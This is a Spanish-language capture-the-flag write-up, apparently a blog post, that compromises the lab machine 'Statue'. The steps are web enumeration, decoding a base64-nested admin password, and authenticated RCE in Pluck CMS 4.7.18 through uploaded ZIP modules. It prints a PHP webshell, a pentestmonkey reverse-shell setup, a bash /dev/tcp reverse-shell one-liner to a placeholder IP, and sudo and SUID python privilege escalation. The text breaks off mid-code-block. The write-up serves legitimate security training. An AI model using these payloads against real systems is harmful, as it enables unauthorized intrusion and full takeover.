---
title: "Statue - TheHackerLabs"
date: 2025-06-11
draft: false
slug: "THL-writeup-statue"
excerpt: "Esta fue una máquina sencilla, pero que necesita bastante trabajo el resolverla. Después de descubrir que se aplica Virtual Hosting, registramos un posible dominio, con el que podemos ver la página web activa. Descubrimos que se está utilizando el CMS Pluck 4.7.18, el cual es vulnerable a Remote Code Execution (Authenticated). Aplicando Fuzzing, descubrimos un archivo que contiene la contraseña del admin del CMS Pluck, pero esta codificada en base64 varias veces. Una vez decodificada, ganamos acceso al login de Pluck y explotamos la vulnerabilidad del CMS Pluck 4.7.18 de forma manual, logrando obtener una Reverse Shell y ganando acceso principal a la máquina víctima. Dentro de la máquina, encontramos un archivo de texto que contiene un par de claves, una codificada en cifrado Playfair y otra en base64. Decodificamos ambas claves y descubrimos la contraseña de un usuario de la máquina, lo que nos permite autenticarnos vía SSH. Ya como este usuario, encontramos un binario dentro de su directorio que contiene la contraseña de otro usuario en su contenido. Obteniendo esta contraseña y autenticándonos como este otro usuario, descubrimos que tiene todos los privilegios del Root, lo que nos permite escalar privilegios de forma sencilla."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "Virtual Hosting", "CMS Pluck", "Web Enumeration", "Fuzzing", "Base64 Decoding", "Remote Code Execution (Authenticated)", "Playfair Cipher", "User Pivoting", "Binary Analisys", "Abusing Sudoers Privileges", "Abusing SUID Binary", "Privesc - Abusing Sudoers Privileges", "Privesc - Abusing SUID Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "echo"
  - "base64"
  - "searchsploit"
  - "PHP"
  - "zip"
  - "nc"
  - "bash"
  - "wget"
  - "grep"
  - "cat"
  - "ssh"
  - "sudo"
  - "strings"
  - "head"
  - "find"
  - "python3"
links:
  - "https://m3n0sd0n4ld.github.io/patoHackventuras/cve-2024-9405"
  - "https://www.exploit-db.com/exploits/51592"
  - "https://www.blackduck.com/blog/pluck-cms-vulnerability.html"
  - "https://github.com/pentestmonkey/php-reverse-shell"
  - "https://planetcalc.com/7751/"
  - "https://es.wikipedia.org/wiki/Charles_Wheatstone"
  - "https://gtfobins.github.io/gtfobins/python/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-statue/statue.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.100
PING 192.168.10.100 (192.168.10.100) 56(84) bytes of data.
64 bytes from 192.168.10.100: icmp_seq=1 ttl=64 time=2.47 ms
64 bytes from 192.168.10.100: icmp_seq=2 ttl=64 time=1.22 ms
64 bytes from 192.168.10.100: icmp_seq=3 ttl=64 time=0.857 ms
64 bytes from 192.168.10.100: icmp_seq=4 ttl=64 time=1.31 ms

--- 192.168.10.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3194ms
rtt min/avg/max/mdev = 0.857/1.461/2.466/0.603 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 12:35 CST
Initiating ARP Ping Scan at 12:35
Scanning 192.168.10.100 [1 port]
Completed ARP Ping Scan at 12:35, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:35
Scanning 192.168.10.100 [65535 ports]
Discovered open port 22/tcp on 192.168.10.100
Discovered open port 80/tcp on 192.168.10.100
Completed SYN Stealth Scan at 12:35, 15.40s elapsed (65535 total ports)
Nmap scan report for 192.168.10.100
Host is up, received arp-response (0.0013s latency).
Scanned at 2025-06-10 12:35:02 CST for 16s
Not shown: 63517 closed tcp ports (reset), 2016 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
           Raw packets sent: 73798 (3.247MB) | Rcvd: 63520 (2.541MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay dos puertos abiertos, supongo que la intrusión será por la página web activa del **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.10.100 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 12:35 CST
Nmap scan report for 192.168.10.100
Host is up (0.00083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 c2:ac:cf:d7:65:58:4b:cf:a2:a1:cd:ff:db:25:b7:79 (ECDSA)
|_  256 e4:4a:ab:9d:d8:7b:8c:d9:6c:6c:9a:52:85:70:b4:8d (ED25519)
80/tcp open  http    Apache httpd 2.4.58

|_http-title: Index of /
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 192.168.10.100; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Curiosamente, no está reportando nada la página web y, si vamos a verla, no encontraremos contenido:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura1.png">
</p>

Es posible que se esté aplicando **Virtual Hosting**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Normalmente, el dominio que se ocupa como **Virtual Hosting** es: `<nombre_máquina>.thl`

Vamos a comprobarlo, registrándolo en el `/etc/hosts`:
```bash
nano /etc/hosts
--------------------
192.168.10.100 statue.thl
```

Visitemos la página web usando ese dominio:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura2.png">
</p>

Funcionó.

Podemos ver que se está utilizando el **CMS Pluck**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura3.png">
</p>

Solamente se destaca que se usa el **lenguaje PHP**.

En la URL, vemos que se está utilizando el parámetro `?file=`, podríamos probar si es vulnerable a **LFI**, pero al intentarlo ocurre lo siguiente:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura4.png">
</p>

Si seleccionamos el botón **admin** que se ve cerca de **pluck**, nos llevará al login del **usuario admin**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura5.png">
</p>

Ahí mismo, vemos la versión de **Pluck** que se está utilizando, siendo la **versión 4.7.18**. Además, si revisamos el código fuente de la página principal, veremos también la versión de **Pluck** utilizada:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura6.png">
</p>

De ahí en fuera, no encontramos algo más.

Antes de investigar si hay un Exploit para esta versión de **Pluck**, vamos a aplicar **Fuzzing** para ver qué podemos encontrar.

### Fuzzing {#fuzz}

Primero, probemos con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://statue.thl/FUZZ -t 300 -e .php,.txt,.html,.cgi,.md

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://statue.thl/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .php .txt .html .cgi .md 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 10ms]
index.php               [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 144ms]
login.php               [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
templates               [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 115ms]
data                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 43ms]
admin.php               [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 81ms]
plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 34ms]
install.php             [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 51ms]
README.md               [Status: 200, Size: 2922, Words: 1, Lines: 39, Duration: 9ms]
javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 52ms]
robots.txt              [Status: 200, Size: 47, Words: 4, Lines: 3, Duration: 80ms]
requirements.php        [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 57ms]
docs                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 6392ms]
files                   [Status: 500, Size: 613, Words: 65, Lines: 17, Duration: 8510ms]
SECURITY.md             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5922ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 48ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 49ms]
                        [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 23ms]
:: Progress: [7642908/7642908] :: Job [1/1] :: 269 req/sec :: Duration: [0:48:50] :: Errors: 9 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-e*       | Para indicar extensiones de archivos a buscar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://statue.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 300 -x html,php,txt,cgi,md
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://statue.thl/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,cgi,md,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 302) [Size: 0] [--> http://statue.thl/?file=rodgar]
/.php                 (Status: 403) [Size: 275]
/images               (Status: 301) [Size: 309] [--> http://statue.thl/images/]
/login.php            (Status: 200) [Size: 1242]
/files                (Status: 500) [Size: 613]
/templates            (Status: 301) [Size: 312] [--> http://statue.thl/templates/]
/data                 (Status: 301) [Size: 307] [--> http://statue.thl/data/]
/admin.php            (Status: 200) [Size: 3733]
/plugins              (Status: 301) [Size: 310] [--> http://statue.thl/plugins/]
/docs                 (Status: 301) [Size: 307] [--> http://statue.thl/docs/]
/install.php          (Status: 200) [Size: 3742]
/README.md            (Status: 200) [Size: 2922]
/javascript           (Status: 301) [Size: 313] [--> http://statue.thl/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/requirements.php     (Status: 200) [Size: 3754]
/SECURITY.md          (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 7642992 / 7642998 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar extensiones de archivos a buscar. |

Hay varios archivos que podemos visitar, pero el que tiene algo interesante, es el archivo **README.md**.

## Explotación de Vulnerabilidades {#Explotacion}

### Decodificando Contraseña en base64 y Ganado Acceso al Login de Pluck {#base64}

Revisando el archivo **README.md**, encontramos un mensaje codificado en **base64**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura7.png">
</p>

Vamos a copiarlo y a decodificarlo:
```bash
echo -n "Vm0wd2QyUXlVWGxWV0d4..." | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
```
Se tuvo que decodificar 17 veces.

Parece ser una contraseña

Vamos a probarla en el login:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura8.png">
</p>

Excelente, ganamos acceso al login de **Pluck**.

### Explotando Vulnerabilidad de Pluck 4.7.18 - Remote Code Execution (Authenticated) {#Pluck}

Buscando en la base de datos de **Exploit-DB** de Kali con **searchsploit**, podemos encontrar un Exploit para la versión de **Pluck** que se está utilizando:
```bash
searchsploit pluck 4.7.18
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Pluck v4.7.18 - Remote Code Execution (RCE)                                                                                                                 | php/webapps/51592.py
pluck v4.7.18 - Stored Cross-Site Scripting (XSS)                                                                                                           | php/webapps/51420.txt

|---|---|
Shellcodes: No Results
```

Vamos a descargar el Exploit que aplica un **Remote Code Execution (RCE)**:
```bash
searchsploit -m php/webapps/51592.py
  Exploit: Pluck v4.7.18 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51592
     Path: /usr/share/exploitdb/exploits/php/webapps/51592.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
```
Analicemos el Exploit.

El Exploit parece entrar en la instalación de módulos y carga un **archivo ZIP**, que supongo es una Reverse Shell o una WebShell, pero este **archivo ZIP** debes crearlo manualmente.

Entonces, este Exploit solamente sirve para cargar y ejecutar el payload malicioso que queramos utilizar.

Tenemos la ruta que se utiliza de **Pluck** para cargar el módulo:
```python
upload_url = "http://localhost/pluck/admin.php?action=installmodule"
```

Y una vez que se carga, podemos ver dónde se está guardando el módulo:
```python
rce_url="http://localhost/pluck/data/modules/mirabbas/miri.php"
```
Siendo la ruta `/data/module/<nombre_módulo>/<script_malicioso.php>`. Además, comprobamos que se utiliza un script en **PHP**.

Vamos a aprovecharnos de esta vulnerabilidad, para ganar acceso a la máquina.

Lo haremos de forma manual, ya que el script que ejecuta este Exploit, no funcionará.

#### Cargando una WebShell como Módulo a Pluck {#Modulo1}

Primero, vamos a crear nuestra **WebShell de PHP**.

----------
**IMPORTANTE:**

Utilizar una **WebShell de PHP** puede corromper **Pluck**, haciendo que no podamos utilizar ninguna función, aunque nuestro módulo seguirá existiendo.

----------

Crea un nuevo archivo, llámalo **shell.php** y agrega el siguiente script:
```bash
<?php
	system($_GET['cmd']);
?>
```

Bien, ahora vamos a comprimir nuestra **WebShell de PHP** en un **archivo ZIP** con la herramienta **zip**:
```bash
zip shell.zip shell.php
  adding: shell.php (stored 0%)
```

Desde **Pluck**, podemos simplemente cambiar el parámetro `action=start` y por `action=installmodule` y ya podremos cargar el módulo:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura11.png">
</p>

O si lo queremos hacer manualmente, vamos a ir al botón **options** y elegimos la opción **manage modules**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura9.png">
</p>

Luego, escogemos la opción **Install a module...**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura10.png">
</p>

Y así es como llegamos a la parte de instalar el módulo:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura11.png">
</p>

Una vez que lo carguemos, podemos revisar la ruta `/data/module` y ahí debería aparecer nuestro módulo:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura12.png">
</p>

Simplemente, entramos, escogemos el script que es nuestra **WebShell de PHP** y ya podremos ejecutar comandos:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura13.png">
</p>

Apliquemos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Desde la **WebShell**, utiliza la siguiente **Reverse Shell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura14.png">
</p>

Y observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.100] 36450
bash: cannot set terminal process group (947): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Statue:/var/www/pluck/data/modules/shell$ whoami
whoami
www-data
```

#### Cargando una Reverse Shell como Módulo a Pluck {#Modulo2}

Vamos a utilizar la **Reverse Shell** de **PentestMonkey**, puedes descargarla de aquí:
* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>

O solamente utiliza **wget** para descargar la **Reverse Shell**:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

Una vez que lo descargues, vamos a modificarlo para agregar nuestra IP, el puerto y cambiar la shell:
```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = 'Tu_IP';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;
```

Vamos a comprimir la **Reverse Shell** con la herramienta **zip**:
```bash
zip monkey.zip php-reverse-shell.php
  adding: php-reverse-shell.php (deflated 59%)
```

Hacemos el mismo proceso para cargar el **archivo ZIP** como módulo:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura15.png">
</p>

Una vez cargado, podremos ver nuestro módulo en la ruta `/data/module`:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura16.png">
</p>

Vamos muy bien.

Ahora, abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Y solamente abre la **Reverse Shell** que se cargó y revisa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.100] 60200
Linux TheHackersLabs-Statue 6.8.0-41-generic #41-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug  2 20:41:06 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 18:22:19 up 18 min,  0 user,  load average: 0.00, 0.01, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1031): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Statue:/$ whoami
whoami
www-data
```

Ya solamente, obtengamos una **shell interactiva**:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```
Continuemos.

## Post Explotación {#Post}

### Enumeración de Máquina Víctima y Decodificación de Código Cifrado en Playfair {#linEnum}

Veamos qué usuarios existen en la máquina víctima:
```bash
www-data@TheHackersLabs-Statue:/home$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
charles:x:1001:1001::/home/charles:/bin/sh
juan:x:1002:1002::/home/juan:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
```
Tenemos a 2 usuarios.

En el directorio `/home`, encontraremos sus directorios, pero no tendremos acceso a estos:
```bash
www-data@TheHackersLabs-Statue:/home$ ls -la /home
total 16
drwxr-xr-x  4 root    root    4096 Sep  1  2024 .
drwxr-xr-x 23 root    root    4096 Aug 29  2024 ..
drwxr-x---  2 charles charles 4096 Aug 31  2024 charles
drwxr-x---  3 juan    juan    4096 Aug 31  2024 juan
```

Como tal, no encontraremos algo más hasta revisar el directorio `/var/www`:
```bash
www-data@TheHackersLabs-Statue:/home$ ls -la /var/www/
total 20
drwxr-xr-x  5 www-data www-data 4096 Aug 30  2024 .
drwxr-xr-x 14 root     root     4096 Aug 29  2024 ..
drwxr-xr-x  2 www-data www-data 4096 Aug 30  2024 Charles-Wheatstone
drwxr-xr-x  2 www-data www-data 4096 Aug 30  2024 html
drwxr-xr-x  8 www-data www-data 4096 Aug 30  2024 pluck
```

Dentro del directorio `/Charles-Wheatstone`, encontraremos un archivo de texto que parece ser una contraseña:
```bash
www-data@TheHackersLabs-Statue:/home$ ls -la /var/www/Charles-Wheatstone/
total 12
drwxr-xr-x 2 www-data www-data 4096 Aug 30  2024 .
drwxr-xr-x 5 www-data www-data 4096 Aug 30  2024 ..
-rw-r--r-- 1 www-data www-data  133 Aug 30  2024 pass.txt
www-data@TheHackersLabs-Statue:/home$ cat /var/www/Charles-Wheatstone/pass.txt 
Pass KIBPKSAFMTOIQL 

Key Vm0xd1MyUXhVWGhYV0d4VFlUSm9WbGx0ZUV0V01XeHpXa2M1YWxadFVuaFZNVkpUVlVaYVZrNVlW
bFpTYkVZelZUTmtkbEJSYnowSwo=
```

Tenemos dos claves, una que es **Pass** y que no sabemos si está codificada, y tenemos **Key**, que ha sido codificada en **base64**.

Vamos a decodificar la clave **Key**:
```bash
echo -n "Vm0x..." | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d
guardar
```
Se necesitó decodificar 7 veces.

Tenemos la clave **Key**, ahora necesitamos saber en qué está codificada la clave **Pass**.

Si investigamos el nombre de este directorio, resulta ser un científico británico que inventó el **cifrado Playfair**:

| **Cifrado Playfair** |
|:-----------:|
| *El cifrado Playfair es un método de cifrado simétrico que reemplaza pares de letras en un mensaje en texto plano por otro par de letras, utilizando una matriz (cuadrícula) de 5x5. Esta técnica es una forma de sustitución digrámica, donde cada par de letras en el texto en claro se convierte en un par diferente en el texto cifrado.* |

Aquí tenemos una página que nos ayuda a descifrar este cifrado:
* <a href="https://es.planetcalc.com/7751/" target="_blank">Cifrado de Playfair</a>

Tenemos que darle las dos claves que tenemos, la clave **Pass** y la clave **Key** que ya decodificamos:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura17.png">
</p>

Solamente muestra una palabra, supongo que es una contraseña.

Vamos a probarla con el **usuario charles**:
```bash
ssh charles@192.168.100.82
charles@192.168.100.82's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-41-generic x86_64)
...
$ whoami
charles
$ bash -i
charles@TheHackersLabs-Statue:~$ whoami
charles
```
Ganamos acceso como el **usuario charles**.

### Analizando Binario y Escalando Privilegios con Usuario juan {#binario}

Como el **usuario charles**, no tenemos privilegios:
```bash
charles@TheHackersLabs-Statue:~$ sudo -l
[sudo] password for charles: 
Sorry, user charles may not run sudo on TheHackersLabs-Statue.
```

Pero, encontraremos un binario dentro de su directorio:
```bash
charles@TheHackersLabs-Statue:~$ ls -la
total 28
drwxr-x--- 3 charles charles  4096 Jun 11 18:49 .
drwxr-xr-x 4 root    root     4096 Sep  1  2024 ..
lrwxrwxrwx 1 charles charles     9 Aug 31  2024 .bash_history -> /dev/null
-rwxrwxr-x 1 charles charles 16144 Aug 30  2024 binario
drwx------ 2 charles charles  4096 Jun 11 18:49 .cache
charles@TheHackersLabs-Statue:~$ file binario 
binario: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2ac85bd86d7cf4cb26cd7028a5306f635af4a8e2, for GNU/Linux 3.2.0, not stripped
```

Si ejecutamos este binario, nos dará lo siguiente:
```bash
charles@TheHackersLabs-Statue:~$ ./binario 
Mensaje 1 encriptado: D8 00 CB C4 
Mensaje 2 encriptado: CD CF C4 CF D8 CB CE C5 D8 
El mensaje real está oculto en el binario.
```
Tenemos una pista, debemos buscar en el contenido del binario el mensaje oculto.

Podemos analizar el contenido del binario con el comando **strings**:
```bash
charles@TheHackersLabs-Statue:~$ strings binario | head -n 24
/lib64/ld-linux-x86-64.so.2
0ocZ
__cxa_finalize
__libc_start_main
puts
strlen
putchar
printf
libc.so.6
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
juan
generador
Mensaje 1 encriptado: 
%02X 
Mensaje 2 encriptado: 
El mensaje real est
 oculto en el binario.
;*3$"
```
Analizando el resultado, parece que tenemos la contraseña del **usuario juan**.

Comprobémoslo:
```bash
charles@TheHackersLabs-Statue:~$ su juan
Password: 
juan@TheHackersLabs-Statue:/home/charles$ whoami
juan
```
Excelente.

Pasando a su directorio, encontraremos la flag del usuario:
```bash
juan@TheHackersLabs-Statue:/home/charles$ cd ../juan/
juan@TheHackersLabs-Statue:~$ ls -la
total 32
drwxr-x--- 3 juan juan  4096 Aug 31  2024 .
drwxr-xr-x 4 root root  4096 Sep  1  2024 ..
lrwxrwxrwx 1 juan juan     9 Aug 31  2024 .bash_history -> /dev/null
-rwxrwxr-x 1 juan juan 16008 Aug 30  2024 binario
drwxrwxr-x 3 juan juan  4096 Aug 30  2024 .local
-rw-rw-r-- 1 juan juan    33 Aug 30  2024 user.txt
juan@TheHackersLabs-Statue:~$ cat user.txt
...
```

También encontramos otro binario que, al ejecutarlo, aplica un ping al **localhost**:
```bash
juan@TheHackersLabs-Statue:~$ ./binario 
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.035 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.026 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.024 ms
64 bytes from localhost (127.0.0.1): icmp_seq=4 ttl=64 time=0.026 ms

--- localhost ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3091ms
rtt min/avg/max/mdev = 0.024/0.027/0.035/0.004 ms
```
No hay algo que podamos hacer con este binario por ahora.

Si revisamos nuestros privilegios, resulta que tenemos todos:
```bash
juan@TheHackersLabs-Statue:~$ sudo -l
Matching Defaults entries for juan on TheHackersLabs-Statue:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User juan may run the following commands on TheHackersLabs-Statue:
    (ALL) NOPASSWD: ALL
```

Entonces, solamente tenemos que ejecutar la **Bash** como **Root** o, simplemente, autenticarnos como **Rooot**:
```bash
juan@TheHackersLabs-Statue:~$ sudo su
root@TheHackersLabs-Statue:/home/juan# whoami
root
root@TheHackersLabs-Statue:/home/juan# exit
exit
juan@TheHackersLabs-Statue:~$ sudo bash -p
root@TheHackersLabs-Statue:/home/juan# whoami
root
```
Listo, somos **Root**.

#### Escalando Privilegios con Binario Python {#Python}

Investigando que binarios tienen **permisos SUID**, encontraremos el **binario python**:
```bash
juan@TheHackersLabs-Statue:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/python3.12
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/fusermount3
/usr/bin/newgrp
```
Podemos utilizarlo para escalar privilegios y convertirnos en **Root**. Además, podemos utilizarlo desde que ganamos acceso a la máquina, es decir, como el **usuario www-data**.

Para esto, usaremos la **guía de GTFOBins**:
* <a href="https://gtfobins.github.io/gtfobins/python/" target="_blank">GTFOBins: Python</a>

Utilizaremos dos formas:
* Escalada de privilegios con **binario python** con **permisos SUID**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura18.png">
</p>

Tan solo ejecutamos el comando que menciona la guía:
```bash
www-data@TheHackersLabs-Statue:/home$ /usr/bin/python3.12 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
bash-5.2# whoami
root
```

* Escalada de privilegios con **binario python** con **capabilities SUID**:

<p align="center">
<img src="/assets/images/THL-writeup-statue/Captura19.png">
</p>

Aunque intentemos ver si este binario tiene **capabilities SUID** con **getcap**, no mostrará nada:
```bash
www-data@TheHackersLabs-Statue:/home$ getcap /usr/bin/python3.12
```

Pero aun así, el comando que menciona la guía, funciona:
```bash
